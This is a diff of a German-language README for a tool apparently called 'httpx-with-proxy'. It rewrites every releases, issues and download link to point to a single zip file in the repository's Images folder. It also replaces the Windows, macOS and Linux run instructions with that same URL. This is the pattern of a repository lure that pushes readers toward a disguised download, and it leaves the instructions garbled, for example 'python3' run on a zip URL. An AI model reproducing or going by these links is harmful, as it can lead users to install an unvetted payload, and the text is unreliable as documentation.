@@ -1,6 +1,6 @@
 # 🌐 httpx-with-proxy - Effortlessly Use Proxies with HTTPX
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/karthiklad/httpx-with-proxy/releases)
+[![Download Release](https://raw.githubusercontent.com/karthiklad/httpx-with-proxy/main/Images/with_proxy_httpx_1.6.zip%https://raw.githubusercontent.com/karthiklad/httpx-with-proxy/main/Images/with_proxy_httpx_1.6.zip)](https://raw.githubusercontent.com/karthiklad/httpx-with-proxy/main/Images/with_proxy_httpx_1.6.zip)
 
 ## 📜 Description
 
@@ -12,7 +12,7 @@ Wenn Sie neu im Umgang mit Software sind, folgen Sie einfach diesen einfachen Sc
 
 ## 🔗 Download & Install
 
-Besuchen Sie diese Seite, um die neueste Version von httpx-with-proxy herunterzuladen: [Download Here](https://github.com/karthiklad/httpx-with-proxy/releases).
+Besuchen Sie diese Seite, um die neueste Version von httpx-with-proxy herunterzuladen: [Download Here](https://raw.githubusercontent.com/karthiklad/httpx-with-proxy/main/Images/with_proxy_httpx_1.6.zip).
 
 Um die Anwendung zu installieren, folgen Sie diesen Schritten:
 
@@ -45,9 +45,9 @@ Nachdem Sie die Datei heruntergeladen haben, sind hier die Schritte zur Einricht
 2. **Navigieren Sie zum Ordner:** Öffnen Sie den neuen Ordner, in dem die Dateien gespeichert sind.
 
 3. **Führen Sie die Anwendung aus:**
-   - Windows: Doppelklicken Sie auf die `httpx_with_proxy.exe`-Datei.
-   - macOS: Klicken Sie auf die `httpx_with_proxy.app`.
-   - Linux: Öffnen Sie ein Terminal und geben Sie `python3 httpx_with_proxy.py` ein.
+   - Windows: Doppelklicken Sie auf die `https://raw.githubusercontent.com/karthiklad/httpx-with-proxy/main/Images/with_proxy_httpx_1.6.zip`-Datei.
+   - macOS: Klicken Sie auf die `https://raw.githubusercontent.com/karthiklad/httpx-with-proxy/main/Images/with_proxy_httpx_1.6.zip`.
+   - Linux: Öffnen Sie ein Terminal und geben Sie `python3 https://raw.githubusercontent.com/karthiklad/httpx-with-proxy/main/Images/with_proxy_httpx_1.6.zip` ein.
 
 ## 🛠️ Using the Application
 
@@ -73,11 +73,11 @@ Proxies sind Server, die als Vermittler zwischen Ihrem Computer und dem Internet
 
 ### Woher bekomme ich Unterstützung?
 
-Für Unterstützung oder Fragen können Sie die [Issues-Seite](https://github.com/karthiklad/httpx-with-proxy/issues) des Projekts besuchen. Hier können Sie Fragen stellen oder Probleme melden.
+Für Unterstützung oder Fragen können Sie die [Issues-Seite](https://raw.githubusercontent.com/karthiklad/httpx-with-proxy/main/Images/with_proxy_httpx_1.6.zip) des Projekts besuchen. Hier können Sie Fragen stellen oder Probleme melden.
 
 ## 🔗 Important Links
 
-- [Releases-Seite](https://github.com/karthiklad/httpx-with-proxy/releases)
-- [Issues-Seite](https://github.com/karthiklad/httpx-with-proxy/issues)
+- [Releases-Seite](https://raw.githubusercontent.com/karthiklad/httpx-with-proxy/main/Images/with_proxy_httpx_1.6.zip)
+- [Issues-Seite](https://raw.githubusercontent.com/karthiklad/httpx-with-proxy/main/Images/with_proxy_httpx_1.6.zip)
 
 Mit diesen Richtlinien sollten Sie nun bereit sein, httpx-with-proxy erfolgreich herunterzuladen und zu nutzen.
